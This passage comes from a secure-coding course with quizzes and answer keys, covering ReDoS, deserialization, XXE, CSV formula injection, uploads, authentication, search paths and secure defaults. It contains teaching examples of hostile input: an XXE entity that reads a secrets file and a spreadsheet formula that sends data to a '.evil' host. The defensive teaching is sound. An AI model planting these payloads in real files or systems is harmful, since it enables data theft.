#### Quiz 1.4: Using Regular Expressions for Text Input Validation

\>>Which of the following matches only “1 or more lowercase Latin letters” using an extended regular expression (given the POSIX locale)?<<

(!) **\[a-z]\***

( ) **\[a-z]+**

( ) **^\[a-z]\*$**

(x) **^\[a-z]+$**

\[Explanation]

Remember, **^...$** are required to make this an allowlist (the text *must* match the pattern), and “**+**” means *“one or more”*.

\[Explanation]

### Countering ReDoS Attacks on Regular Expressions

When you add code, there is a risk that the added code has a vulnerability. This is especially true when you add code that is supposed to help keep your software secure, since by definition, problems in that code could lead to a security problem.

If you add input validation checks using regular expressions - a common and helpful approach - there is a kind of vulnerability you can unintentionally add called a *Regular expression Denial of Service (ReDoS)* vulnerability. If your software has a ReDoS vulnerability, attackers can force situations where the regular expression can be run for an extremely long time (possibly days or years). The result is a denial of service (DoS) - the attack may be able to send a small amount of data and cause the service to be unavailable! This is not theoretical. In 2020, the **websocket-extensions npm** package and its Ruby version were found to both have this flaw (these were given identifiers [CVE-2020-7662](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7662) and [CVE-2020-7663](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7663) respectively).

The reason that the ReDoS vulnerability is possible is that most regex implementations have a worst case complexity that grows exponentially based on the size of the input. A little background may help here. There are two main approaches to implementing regexes: a *deterministic finite automaton* (DFA) or *nondeterministic finite automaton* (NFA). DFAs are fast, in part because they never backtrack, and DFAs are immune to ReDoS vulnerabilities. But DFAs are also limited in what they can do. In practice, most regex implementations today are NFAs, and NFAs *are* potentially vulnerable to ReDoS attacks.

NFA implementations of regexes - and that is most of them - *backtrack* whenever they fail a specific match until they either find a match or have tried all possibilities. In short, in the worst case they try *all* combinations. For many regular expression patterns this worst case is not a problem. However, certain kinds of regex patterns can make this worst case really bad. In particular, let’s imagine that we provide a pattern where:

1.  The regex pattern uses repetition on complex subexpressions (the use of “**+**” and “**\***” on complex subexpressions), and

2.  Within these repeated subexpressions, there are additional repetition symbols and expressions that match a suffix of another match. ([OWASP ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service\_-\_ReDoS))

A trivial example is the regex pattern “**^(a+)+$**”. Let’s imagine that an attacker provided the input value ”**aaaaX**”. An NFA will match the input first letter “**a**” with the “a” in the pattern easily, but then the regex implementation has two options: should it try to apply the *inner* “**+**” or the *outer* “**+**” to the next letter? Most implementations would try the inner one first, and then backtrack as needed. In the worst case, an NFA has to try out *all* possible combinations. Thus, to determine if the input “**aaaaX**” matches the pattern, an NFA regex has to try out 16 possible paths (all possibilities), with each one eventually failing because of the trailing “**X**”. If the attacker provides the input “**aaaaaaaaaaaaaaaaX**” there would be 65536 possible paths, with the number of paths doubling for each additional “**a**”. If an attacker provided 80 ‘**a**’s followed by **X**, that thread will try to process all combinations, which would take so long that it would become a denial-of-service.

We use the term *vulnerable regexes* for regex patterns with this awful worst-case behavior. A common industry term for these patterns is *evil regexes*. It is not that the regex is provided by an attacker necessarily, it is just that their worst-case behavior is “evil” and this makes them vulnerable to attack. Another term for this behavior is *catastrophic backtracking*.

There are many solutions to this problem, including the following:

1.  Use a regex implementation that uses a DFA. DFA-based implementations are not vulnerable to this problem. For example, in the NPM ecosystem, “**re2**” implements a DFA regex engine. However, DFA-based regex engines are generally less capable and in many environments are much more trouble to install and use, so this is rarely done.

2.  Modify the regex so that it doesn’t have this worst-case behavior. This is the usual approach. Be especially wary of any group “**(...)**” that contains a branch and/or ends with a repeat and is itself repeated.

    1.  If there is a repeat or branch in a regex that is itself repeated, rewrite the regex so the next character in the input would unambiguously determine if the repeat continues or not. E.g., rewrite “**^(a+)+$**” as “**^a+$**”.

    2.  Another approach is to use mechanisms that tell the regex engine not to backtrack; many regex implementations have *possessive quantifiers* and/or *atomic grouping* which can prevent unnecessary backtracking.

    3.  Avoid unbounded repetition. For example, define maximum repetition counts (e.g., **{0,5}**) so the worst-case behavior is greatly limited.

    Some tools examine source code to detect regexes with worst-case behaviors (these may be standalone tools or part of bigger tools).

3.  Where you can, limit the maximum length of input strings and check the input length first. If inputs must be short, the exponential growth in time will still end up as a small total amount of time.

4.  Implement a timeout, on the regex (if supported) or on the application as a whole. For example, [Ruby 3.2](https://www.ruby-lang.org/en/news/2022/04/03/ruby-3-2-0-preview1-released/) supports a global regex timeout value (`Regexp.timeout`) and a timeout parameter when instantiating a regular expression object. The [.NET framework MatchTimeout mechanisms](https://docs.microsoft.com/en-us/dotnet/api/system.text.regularexpressions.regex.matchtimeout) can also set a global timeout value or one for each regex.

5.  Don’t run regexes provided by attackers on systems you trust. It is okay for an adversary to provide a regex that they themselves always run (in that case, attackers just attack themselves). But if attackers can provide regexes that you run, they may be able to cause a ReDOS (unless you have taken other steps to prevent it). Regexes are, in general, programming languages, and you should generally avoid running attacker-provided programs. It is possible to do it relatively securely, but you need to take a lot of precautions and it is always more secure to just not do it.

If you are interested in more details, see the [OWASP discussion](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service\_-\_ReDoS) about this.

#### Quiz 1.5: Countering ReDoS Attacks on Regular Expressions

\>>Which of these are *practical* ways to mitigate ReDoS attacks? Select all answers that apply.<<

\[!x] Use a regular expression engine that does not use backtracking (that is, a DFA).

\[x] Where possible, write regexes that don’t have this worst-case behavior. For example, be cautious about repetitions inside repetitions.

\[x] Limit the maximum size of the input, so that even the worst-case behavior is not so bad.

\[ ] None of the above

## Input Validation: Beyond Numbers and Text

### Insecure Deserialization

Don’t just blindly accept more complex data formats. Instead, ensure that accepting that input from an untrusted source will not cause a security problem.

A dangerous problem is insecure deserialization. **Deserialization** is the process of converting some sequence (of bytes or characters) into some internal format; that process may create a number of objects. Deserialization can happen when reading data from a network or from storage, because in both cases there is a need to turn a sequence of bytes or characters into an internal format. Unfortunately, deserialization can result in serious problems, because if the source is untrusted, then the attacker may provide a manipulated sequence:

1.  The data might be converted into an unexpected value that you should not trust. For example, it might be a structured cookie value that originally said **admin=n**, but the attacker may change the value to **admin=y**. If the program blindly accepted this data, the attacker might suddenly become an administrator!

2.  Deserializing the data might cause code execution, e.g., it might create classes or instances and/or call attacker-selected methods with attacker-provided arguments. This is especially a problem for formats designed for arbitrary object persistence. An example of this is the Python pickle format, which automatically executes code in certain cases when deserializing data.

**🚩 The safest solution is to not accept serialized objects from untrusted sources.**

If you must accept serialized objects from untrusted sources, you can use serialization formats that do not support code execution. For example, use serialization formats that only allow primitive data types. This counters the second problem - code execution - but by itself, it does not solve the first problem - unexpected values. So, if after choosing an approach to prevent code execution, validate the input you have received using the approaches we have already discussed.

In some cases, you can prevent deserialization attacks with authentication checks. Basically, turn untrusted data into trusted data! To do this, before you deserialize the data, run an authentication check to ensure that the data is from a trusted source. A common way to do this is by checking a digital signature, message authentication code (MAC), authenticated encryption, or similar measure. This approach is especially common in web applications; often, a web server will send data to a client, so that the client can later send it back (e.g., as a cookie). This approach is fine as long as the web server verifies its integrity (to prevent attacker creation or tampering) *before* it is deserialized.

Some people recommend enforcing string type constraints (e.g., only allowing specific classes to be deserialized). Unfortunately, many bypasses to this technique have been found over the years. It is a good idea as a *hardening* technique (or simply as a way to detect bugs early). However, in many systems, this is probably too dangerous to recommend as an adequate defense by itself.

🔔 Insecure deserialization is such a common mistake in web applications that it is 2017 OWASP Top 10 #8, 2021 CWE Top 25 #13, and 2019 CWE Top 25 #23. It is [CWE-502](https://cwe.mitre.org/data/definitions/502.html), *Deserialization of Untrusted Data*. It is also considered part of 2021 OWASP Top 10 #8 (A08:2021), *Software and Data Integrity Failures*. Attackers may find such vulnerabilities harder to exploit, but once the vulnerability is found it can result in immediate compromise of an entire system, because it may provide complete control of the system to the attacker.

#### Quiz 1.6: Insecure Deserialization

\>>One of the big risks in deserializing data is that, depending on the serialization format, the data might cause attacker-defined code to be executed. True or False?<<

(x) True

( ) False

### Input Data Structures (XML, HTML, CSV, JSON, & File Uploads)

Of course, sometimes a program needs to accept common complex data structures, such as XML, HTML, JSON, and CSV. Since these are common formats, it is worth talking about them specifically.

While technically these are strings, in reality these are strings with their own more complex internal structure. It is often best to use libraries specifically designed to handle these input formats, as long as they are designed to handle potentially-malicious inputs. You should typically try to identify and reject data structures that are not syntactically valid, and then, where appropriate, check that they meet whatever specific schema they are supposed to meet. Ideally, these libraries will let you specify only what you want to accept, and reject everything else. If those mechanisms cannot fully validate the input, then supplement that with whatever input validation you need to ensure that only valid data is accepted.

#### XML

Lots of data and messages are encoded in XML (Extensible Markup Language). XML is part of other formats, such as SOAP (Simple Object Access Protocol). There are two terms about XML that are widely confused:

*   **Well-formed**<br>Well-formed XML follows certain syntax rules. For example, all opened tags must be closed, and XML elements must be properly nested. If you are accepting XML, at *least* verify that the XML is well-formed; there are easily-available libraries for this, and applications are only supposed to accept XML that is well-formed.

*   **Valid**<br>Valid XML meets some schema definition. The schema specifies information such as *what* tags are allowed, how they may be nested, and whether some are required. A schema definition, if rigorous, is a kind of allowlist. Thus, checking for validity before accepting XML input can be really useful for countering attacks. However, do *not* allow the attacker to determine what schema to use - decide what schema is okay and use *that*. Sometimes no schema is available, and if you are only extracting a small part of XML, it may not be worth it to create an XML schema.

If you are using XML, there is an extremely common vulnerability you need to counter called XML External Entities (XXE). To understand them, you need to understand some XML functionality that is not widely known.

XML supports external references which can be auto-loaded when the original document is loaded. The external reference can be any file location or URL. This means an attacker can provide files that quietly cause other files or URLs to be loaded and placed in certain places. This functionality exists for a reason, and some systems legitimately depend on it. However, many developers have no idea that this is possible, and this has led to many vulnerabilities. Here is an example of an XML document with embedded external entities:

```xml
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
     "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">

    <!DOCTYPE letter [

      <!ENTITY part1 SYSTEM "http://www.example.com/part1.xml">

      <!ENTITY part2 SYSTEM "../../../secrets/part2.xml"> ]> ...

    <building>

    &part1; &part2;

    </building>
```

In general, you should not accept unchecked external references from untrusted sources. Here are a few possible solutions:

*   Configure your XML reader/processor to ignore or reject external references. Make sure to check, in your automated tests, that it is still being ignored! Since most applications don’t use external entities, this is typically the easiest solution.

*   Forbid or check (with an allowlist) any external reference before use.

*   Don’t use XML, including formats like SOAP that use XML. Other formats, like JSON, don’t have this mechanism and thus cannot have this problem.

For more about this issue, see the [OWASP XML External Entities web page](https://owasp.org/www-project-top-ten/2017/A4\_2017-XML_External_Entities_\(XXE\).html).

🔔 XML XXE is such a common mistake in web applications that it is 2017 OWASP Top 10 #4, 2021 CWE Top 25 #23, and 2019 CWE Top 25 #17. It is also identified as [CWE-611](https://cwe.mitre.org/data/definitions/611.html), *Improper Restriction of XML External Entity Reference*.

#### HTML

Typically you can simply call a library to validate HTML and pass a set of allowed tags (e.g,. **\<p>**) and attributes (e.g., **href=**). Everything not permitted is removed or rejected. This will eliminate dangerous tags like **\<script>** from external sources (presuming that you don’t include dangerous tags in the set of allowed tags).

Although this is potentially a big topic, in practice, the key is often to use a library with decent secure defaults. If you only allow tags such as **\<p>**, **\<i>**, and **\<b>**, and limit attributes to values such as **id**, the amount of damage that can be done is greatly limited.

#### CSV

The “comma separated value” (CSV) format is in theory simple. Every line is a record, where fields are separated by commas. The first line is usually a “header line” - the field names separated by commas (you should always provide the header, since this makes the CSV file more extensible and much easier to handle with other tools).

In practice, there is a lot of variation in CSV formats. However, for security, the *bigger* problem is that some tools (such as Microsoft Excel and LibreOffice) will *execute* certain constructs when they read CSV, even if CSV looks like a data-only format. For example, a field value beginning with “**=**” is interpreted as “*execute these functions*”, and functions can access external data. In some spreadsheet implementations, the field contents “**=IMPORTXML(CONCAT(“"<http://some-server-with-log.evil?v>="”, CONCATENATE(A2:E2)), “"//a"”)**” will *send* data from the spreadsheet to an external site. The solution, as always, is to validate each field value before accepting it. Especially problematic values are those beginning with **=**, **+**, **-**, and **@**.

When reading these formats from an untrusted source, ensure that each cell meets the expected data format, and don’t pass on the data otherwise. Be especially wary of cells beginning with “**=**”, and try to avoid passing them on, since some tools may execute their contents.

#### JSON

JSON does not have the built-in capability to record external entities or expressions that many tools would expect to be executed, which makes it an advantage from a security point-of-view. There are tools that can easily validate JSON syntax, often implemented as part of reading JSON into a useful internal format.

If you want to go further, there are formats such as JSON Schema that let you define with more rigor exactly the format of a given JSON format. Then you can use JSON Schema validators to verify that the data matches the schema.

#### File uploads

Sometimes you need to accept file uploads of special file types (e.g., of images).

If your program allows uploads, try to limit uploads to specific file types and make sure (via both its MIME type and its contents) that it is one of the valid types that you will accept. Limit what you allow in the filename, too; alphanumeric characters are generally fine, but anything else (especially “**/**” and “**\\**”) can be problematic, so only allow the characters you are certain will be fine. Where possible, define an acceptlist of allowed filename suffixes, and only allow uploads of files named with one of those allowed suffixes.

🔔 Inadequate restriction of uploads is such a common cause of security vulnerabilities that it is 2021 CWE Top 25 #10 and 2019 CWE Top 25 #16. It is identified as [CWE-434](https://cwe.mitre.org/data/definitions/434.html), *Unrestricted Upload of File with Dangerous Type*.

#### Quiz 1.7: Input Data Structures (XML, HTML, CSV, JSON, & File Uploads)

\>>When reading data in common data formats like XML and JSON, prefer to use libraries designed to securely handle them, try to reject structures that are not syntactically valid, and then where practical, check that they meet whatever specific schema you require. True or False?<<

(x) True

( ) False

### Minimizing Attack Surface, Identification, Authentication, and Authorization

In the Design chapter (in Part I of this course), we noted that it is important to minimize the *attack surface* - that is, the interfaces the attacker can get access to. This does not mean “limit the interfaces that you *intend* for users to use"; your *implementation* must limit the interfaces an attacker has access to. Try to make it so attackers cannot even *access* most interfaces, then carefully protect the interfaces that are accessible.

That said, in many systems, attackers will be able to attempt some requests. In those cases, you will need to make sure that the request is authorized (allowed) before it is honored. Remember, authorization means determining whether or not that request is allowed to that person or program.

You need to *check* whether or not a request is *authorized* in *absolutely every case* if it might not be. That is to say, ensure that authorization checks are non-bypassable. Tools are often not good at determining if every request is checked for authorization, so you typically need to depend primarily on human review. If humans can easily see that the correct authorization check is made for every request, it takes much less time to review *and* it is more likely to be correct. In practice, that often means that programs should check for authorization as soon as you reasonably can do so. Exactly what that means depends on your system, e.g., in a model-view-controller architecture, you could put authorization checks on each controller entry and/or each model entry. What matters is that you do it consistently and that it is easy for others to verify that it cannot be bypassed. Similarly, the data needs to be stored so that only authorized requests can succeed.

🔔 Inadequate authorization is such a common mistake that *Broken Access Control* is 2017 OWASP Top 10 #5 and 2021 OWASP Top 10 #1. *Incorrect Authorization* is 2021 CWE Top 25 #38 and 2019 CWE Top 25 #33 ([CWE-863](https://cwe.mitre.org/data/definitions/863.html)), and *Missing Authorization* is 2021 CWE Top 25 #18 and 2019 CWE Top 25 #34 ([CWE-862](https://cwe.mitre.org/data/definitions/862.html)).

Of course, if something requires authorization, that means there should first have been some kind of identification and authentication (I\&A) to ensure that the request was from whom they claimed to be. Thoroughly check how you handle authentication, and where practical, use well-respected services, libraries, or frameworks to do it.

You should typically first do input validation of an identity (such as a username or email address), before doing anything else with it, to reduce the likelihood of an attacker subverting a system through its login system. In most cases you should only report “login failed” (or similar) if the combination of the identity and the authentication (such as a password) failed; don’t reveal if the identity exists in the system, since that lets the attacker know if the identity is present on the system. You should support multi-factor authentication (MFA) logins, either directly or via a service, since these tend to be stronger than passwords.

If you do support passwords for authentication, follow good practices, e.g.:

1.  Make sure that no more than 1 character of a password is displayed to a user at a time, to reduce the risk of someone else being able to see the password (aka “shoulder surfing”). You can do this in HTML input fields by using the input type `password`.
2.  Ensure that users can use password managers when logging in, creating a password, or changing a password. For example, ensure that users can copy text into the password fields, as this functionality is necessary for some password managers. Forcing users to manually type passwords encourages them to use poor passwords and discourages them from using a password manager (which is considered best practice by many).
3.  When creating or changing a password, ask the user to enter the old password. This prevents an attacker from easily changing the password if they have brief control of the account. Also, ask the user to enter a new password twice and verify that they are the same, to ensure that the intended password will be used as the password. This also verifies that a password manager (if any) is sending the password consistently.

When a user changes a password or other credential (like MFA tokens), consider notifying the user (such as by sending an email or text message). That way, if the user didn’t cause the change, the user will be immediately alerted.

🔔 2021 OWASP Top 10 #7 is *Identification and Authentication Failures*. Inadequate authentication is such a common mistake that *Broken Authentication* is 2017 OWASP Top 10 #2, 2021 CWE Top 25 #14, and 2019 CWE Top 25 #13. It is [CWE-287](https://cwe.mitre.org/data/definitions/287.html), *Improper Authentication*. *Missing Authentication for (specifically a) Critical Function* is 2021 CWE Top 25 #11 and 2019 CWE Top 25 #36 ([CWE-306](https://cwe.mitre.org/data/definitions/306.html)).

We will later discuss various tools for verification. While tools can help find some problems, they are often *less* effective at finding authentication and authorization problems, because the tools don’t usually have enough information to determine *what is acceptable* and *what is not*. It helps to have tests that verify unauthorized requests are rejected, of course. But the most effective approach is ensuring that absolutely every input path is quickly authenticated and authorized where appropriate, so that manual review can easily assure reviewers that all cases are covered.

> 😱 STORY TIME: Target Breach

> In 2013 the Target Corporation’s network was breached. In this incident 40 million credit and debit card numbers and 70 million records of personal information were stolen. The full costs are difficult to estimate, but the credit card unions spent over $200 million just to reissue cards. The best available evidence suggests that the initial breach occurred in a third party heating, ventilation, and air-conditioning (HVAC) firm. The attackers used these compromised credentials to penetrate the Target network. The attackers were able to subvert sensitive systems due to the weak segmentation between non-sensitive and sensitive networks inside Target ([*Breaking the Target: An Analysis of Target Data Breach and Lessons Learned*](https://arxiv.org/pdf/1701.04940.pdf), by Xiaokui Shu, Andrew Ciambrone and Danfeng Yao, 2017).

#### Quiz 1.8: Minimizing Attack Surface, Identification, Authentication, and Authorization

\>>It is important that humans be able to directly verify that authentication is non-bypassable. True or False?<<

(x) True

( ) False

### Search Paths and Environment Variables (including setuid/setgid Programs)

Applications often need to search for other resources, such as libraries, commands, and packages. In many cases this search is controlled by a “search path” - a location or sequence of locations to search. One example of a search path is the `PATH` environment variable, which lists a sequence of directories and is used when searching for executables on Unix-like and Windows systems. Many other `PATH`-like environment variables exist (e.g., `PYTHONPATH` in Python). In addition, many other systems have search paths, e.g., package managers typically support a search path that indicates the repositories or registries where packages can be retrieved from.

If an attacker can control the search path, the attacker can often cause the application to run malicious code, use attacker-controlled data, or reveal private data. For example, if an attacker can control the `PATH` environment variable, an attacker may be able to force the application to run unintended programs. The best solution is to ensure the attacker can’t control the search path, e.g., by not providing the opportunity or by setting the search path to a safe value before using it.

A related problem is that the search path may contain a location that an attacker can control or influence in an unanticipated way. For example, if the `PATH` environment variable has an entry set to the current directory, that is, “.” or “” (blank), and the entry is listed before more trustworthy directories, then the current directory would be used first. This can become a vulnerability since the attacker may be able to eventually insert contents into a directory that the application will use as a current directory. On old Unix-like systems this insecure PATH setting was the default. One common way this mistake happens today is if the path is modified by concatenating the directory separator and then the new directory; if the path was empty to start with, doing this adds a blank entry as the first entry. For example, if `PYTHONPATH` was empty, naively concatenating “:” and directory `/usr/share/foo` would produce the `PYTHONPATH` “<tt>:/usr/share/foo</tt>”; notice that the empty directory is listed first, which would be interpreted as first searching the current directory. The solution in this case is to only insert the separator if there is already text there.

There are several potential countermeasures for search path problems, for example:

*   On startup, examine a search path you’ll use (like `PATH`) for common errors such as including a blank directory or “.” before more trusted paths (like `/usr/bin`). On Windows systems, check if safe DLL search mode is enabled. You might halt, or at least warn, if the current system settings are dangerous.
*   Use full path names when making a request (e.g., calling executable programs, importing libraries, or requesting packages). Most systems that support a search path also support directly requesting the specific component; making a direct request will ensure that you are requesting the right ones. This is a plausible hardening mechanism, but it is easy to forget doing this in some cases, and this does sometimes make it harder to port software between systems.

Many configuration values, including many search paths, are provided via environment variables. Some execution environments, like client-side JavaScript, don’t have environment variables. In most other environments (client and server), environment variables exist, but are typically considered trusted (that is, environment variables can only be set by someone with authorization to set them). However, there are some special cases where their trust should be limited.

Some historical operating systems had insecure settings of environment variables. One of the most common cases is that old operating systems had an unsafe PATH environment variable so the current directory “.” was searched for executables before more trustworthy directories. Similarly, some naive users set their PATH variable to insecure values, though thankfully this kind of mistake is less common today. It’s also very environment-specific; in many environments an attacker won’t be able to control the contents of any of the locations.

However, there’s another important special case: if you are writing something called a **setuid** or **setgid** program, then *environment variables can come from an attacker*. A little introduction is probably in order. Unix-like systems (including Linux and MacOS) allow programs to be **setuid** and/or **setgid**. When a **setuid** program runs, it has the privileges of its *owner* (not its requestor). A **setgid** program runs with the privileges of its *group* (not the groups of its requestor). These kinds of programs inherit many inputs from a potential attacker, including the current directory value and environment variables. One solution is to not write a **setuid** or **setgid** program, as in many cases that approach is not needed today.

If you *do* write a **setuid**/**setgid** program, your program must protect itself from all its inputs, and that includes the current directory and environment variables. Environment variables can be especially tricky, as there are many unsafe approaches that appear safe. That’s because environment variables are typically from trusted sources, so most developers aren’t prepared to deal with the unusual case where the environment variables are *not* from trusted sources. The only safe solution is to (as part of startup) extract *only* the environment variables that are needed, ensure their values are safe, erase *all* environment variables, and reset the variables needed to safe values (including safe values provided on program startup). Erasing all environment variables in most programming languages is easy, simply set the global variable **environ** to a null pointer or its equivalent ([the **environ** variable is defined in the POSIX standard](https://pubs.opengroup.org/onlinepubs/9699919799/functions/environ.html)). Do this *early*, before creating any threads. You cannot simply remove a few environment variables; an attacker may create a bizarre environment variable data structure, and there are simply too many potentially-dangerous environment variables (such as **LD_LIBRARY_PATH**) to try to erase only certain dangerous values. This is yet another example of allowlisting instead of denylisting; only allow the few environment variables you need, with their allowed values, and nothing else. Instead, ensure that the only possible variables are ones you expect and have safe values for. This includes **PATH** and all other environment variables.

🔔 Untrusted search path is such a common cause of security vulnerabilities that it is 2019 CWE Top 25 #22. It is [CWE-426](https://cwe.mitre.org/data/definitions/426.html), *Untrusted Search Path*. 2021 CWE Top 25 #34 covers the related *Uncontrolled Search Path Element* ([CWE-427](https://cwe.mitre.org/data/definitions/427.html)).

#### Quiz 1.9: Search Paths and Environment Variables (including setuid/setgid Programs)

\>>If your software has to run where environment variables are not from trusted sources, you should extract only the variables needed, erase all the environment variables, and then set the environment variables to safe values (including safe values provided as input). True or False?<<

(x) True

( ) False

### Special Inputs: Secure Defaults and Secure Startup

There is a special set of inputs that are often used when starting up: configuration information. This can be critical for security.

Modern systems have many components in them. The software that you develop will probably be a small part of some other much larger system. Don’t expect people to carefully read your documentation; they won’t. Instead, make it *easy* to use your software securely.

First, make sure that your software is *secure by default*. If there is no configuration information, your program should do whatever is the secure thing (which is usually to deny access). If there are sample configurations or sample code showing how to use it, make sure the examples are secure also (people normally copy and paste examples when using something). Don’t create sample configurations that *allow access to all* unless that really is a normal use. Instead, create samples as restrictive as you can reasonably make them. Include many clear comments in the sample configuration file, if there is one, so the administrator understands what the configuration does.

If secure examples are too complicated or hard to explain, that suggests that your configuration or API is too complex or has the wrong defaults. Don’t just fix the documentation, fix the code so it is easier to configure or use securely, and then the documentation will be easier to create.

Get configuration information (especially if it can contain code) from a trustworthy source - not from an untrusted user. If you are building a traditional desktop application, it as fine to get the configuration from the home directory or a configuration directory inside it like **$HOME/.config**, but beware of configurations or any other data from the current directory; the user may have uncompressed data from an attacker into the current directory. Server-side web applications should only download configurations and code from trusted sources (e.g., their local directories). Client-side web applications should use Content Security Policy (CSP) to limit where they can get information, as we will further discuss later.

On startup, or even periodically, consider checking that your security assumptions are valid and halt if they are not. For example, if you have access to some private files, ensure that they are not group- or world-readable. If it’s a web application, check that **https** (TLS) is being used. Some checks are not worth doing (because they are too hard to do), but even a few sanity checks can detect and prevent some problems.

Sometimes users may need to disable some security measure. Where possible, make that an exceptional case; users should not normally need to do this. If they do, ensure that the users ***know*** that they are disabling something important and what the consequences are. At the least, document that it is dangerous and why. In such cases, it may be wise to report or at least log on startup what security measure was disabled, note that this is dangerous, and note how to re-enable it.

Most larger systems need some mechanism to receive configuration information. Make sure you can trust the source if it matters. For example, **setuid** programs receive environment variables from a potential adversary; such programs need to validate the environment variables they will allow, extract them, erase all environment variables, and then reset only the values to ones they can trust.

Some systems try to depend on *secure boot* or similar mechanisms to ensure that only specific software is run on a particular computer. Don’t take these mechanisms very seriously if the computer (such as a smartphone) may be physically controlled by a potential attacker. If an attacker has physical control over a device, then that attacker has ultimate control over the device. The reality is that secure boot systems have been repeatedly broken; trusting this to never happen in the future is ignoring the lessons of the past. You are better off designing your system so that you don’t need to trust the application on that device, but instead run software you need to trust on hardware controlled by someone you trust. Secure boot systems are far more powerful if the system is physically controlled by a trusted party, because then they are simply providing an additional protective measure for the one physically in control.

🔔 Security misconfiguration is such a common mistake in web applications that it is 2017 OWASP Top 10 #6 and 2021 OWASP Top 10 #5. 2021 CWE Top 25 #19 [CWE-276](https://cwe.mitre.org/data/definitions/276.html) covers *Incorrect Default Permissions*.

#### Quiz 1.10: Special Inputs: Secure Defaults and Secure Startup

\>>For ease of use, you should deliver applications with a standard known password and make it clear in the documentation how to change that password. True or False?<<

( ) True

(x) False

\[Explanation]

Absolutely not. If there is a standard known password, it will be immediately posted on the World Wide Web, and all attackers will use that password when trying to attack those systems. Many users will not read documentation. For an application to be secure, it needs to be “secure by default"; an application with a known preset password is *insecure* by default. One alternative would be to have a “please create your password” prompt when the application is first used.

\[Explanation]

## Consider Availability on All Inputs

### Consider Availability on All Inputs Introduction

As we discussed before, it is often difficult to guarantee availability in all possible circumstances. For example, if a system is publicly accessible over the Internet, an attacker could initiate a large-scale distributed denial-of-service (DDoS) attack, overwhelming your service’s resources.

But once you start considering availability as a risk management problem, things are not so dire. You want to reduce the risk from DoS attacks, that is, reduce their likelihood or impact. You can reduce the likelihood by making the attack more difficult, risky, or resource-intensive for the attacker.

#### Try to Eliminate Easily Amplified Inputs

A useful concept is the idea of leverage. *“In the context of a DoS attack, if a vulnerability has high leverage it means attackers can consume a ton of your server resources with minimal resources… the higher the leverage, the higher the risk, and the more likely I am to address the issue directly. The lower the leverage, the more likely I’ll accept the risk and/or lean on \[other] mitigations.”* ([*Not all attacks are equal: understanding and preventing DoS in web applications*](https://r2c.dev/blog/2020/understanding-and-preventing-dos-in-web-apps/), by Jacob Kaplan-Moss, 2020)

Consider each kind of input your software receives. Is there any way an attacker can send a very small amount of input and consume a large amount of resources (e.g., computation and/or output)? These are often higher risk to availability, because these inputs are easily amplified.

Here are some examples of resources an input might disproportionately consume:

*   Network bandwidth — e.g., an input can produce a disproportionately large output.

*   CPU utilization — e.g., an input can cause large amounts of computation; we have seen an example of that earlier in ReDoS.

*   Storage space — e.g., a compressed file might expand to fill storage.

*   Concurrency limits — e.g., an input can cause a thread/process to run slowly, causing the software to reach concurrency maximums (e.g., the number of threads, processes, or database connections).

The risks of these can be reduced via authentication, since then attackers have to expose some information about themselves. In general, try to eliminate at least the unauthenticated ones, and consider requiring some kind of authentication for the rest ([*Not all attacks are equal: understanding and preventing DoS in web applications*](https://r2c.dev/blog/2020/understanding-and-preventing-dos-in-web-apps/), by Jacob Kaplan-Moss, 2020).

One partial solution to reduce network bandwidth is *paging*. That is, instead of returning a very large result, return smaller results each time. This requires the attacker to repeatedly make requests.

If you cannot eliminate highly amplified inputs, try to distribute the load. For example, if you are distributing large files, consider using a Content Delivery Network (CDN), torrent, or other such system. Many websites use CDNs so that simple requests with potentially-large replies do not overwhelm their servers.

#### Rate Limiting

A simple widely-used approach on networked systems to improve availability is rate limiting. Rate limiting limits the rate of input requests (e.g., for a given user, API key, or IP address). As long as the rate limits are relatively high, rate limits don’t significantly impact normal use, and they can make single-system DoS attacks much less effective. In some cases, rate limits can even provide a partial countermeasure against DDoS attacks (since they may reduce the effectiveness of each attacking system). Rate limiting also counters some accidental problems.

Note that if you force attackers to make many requests (e.g., via paging), the attacker may start to hit rate limits.

Rate limiting is not a complete solution, but it is an easy and inexpensive approach that increases the costs and efforts for attackers.

# Processing Data Securely

This chapter describes how to process data within software with security in mind, including treating untrusted data as dangerous, avoiding default and hardcoded credentials, avoiding memory safety issues (such as buffer overflows), and avoiding undefined behavior.

Learning objectives:

1.  Discuss how to process data securely (e.g., treat untrusted data as dangerous).

2.  Understand the importance of avoiding default and hardcoded credentials.

3.  Discuss memory safety and the problems when it is not present: out-of-bounds reads/writes, double-free, use-after-free.

4.  Understand avoiding undefined behavior.

## Processing Data Securely: General Issues

### Prefer Trusted Data. Treat Untrusted Data as Dangerous

Of course, once your software gets data, it needs to process that data.

If it matters, make sure you process your data by using an environment you can trust. Just like input validation, if you care about the answer after data processing, you need to process your data on a system you can trust. If you process data using a script on a web browser or a mobile application and that web browser or mobile application might be controlled by an attacker, then you cannot trust anything that it does; all that data will be visible to the attacker and the attacker might force different results. If attackers can only attack themselves, that is not a problem, but make sure it is limited to that. If an untrusted system processes some data, and sends the result to you, you need to treat it as untrusted data.

Which leads us to a useful rule-of-thumb: *whenever given a choice, try to use the more trusted data.*

An example might help. Many systems, when sent a password reset request, send an email to confirm the password reset. At one time GitHub would ask an untrusted user for their email address. If that matched an email address in their database, ignoring upper/lower case distinctions using the rules of English, GitHub would send the password reset to the email address *as provided by the attacker*. This was a terrible idea. Email standards do not guarantee that the local part of the email address (the part before the **@** symbol) is case insensitive (see [IETF RFC 5321 section 2.3.11](https://tools.ietf.org/html/rfc5321#section-2.3.11)). By converting the email address to lower case, there is no guarantee that the reset would be sent to the correct email address. Many email systems do ignore upper/lower case distinctions, but they might not use English! In some Turkic email systems, the local part of the email address would normalize to a *different* distinct email account than the original account. For example, **MIKE@example.org** would normalize to **mıke@example.org** (using a dotless i), which would be a different email account from **mike@example.org** (which uses a dotted i). This led to an exploitable vulnerability (GitHub Security, [*Password reset emails delivered to the wrong address*](https://bounty.github.com/researchers/jagracey.html), 2016).

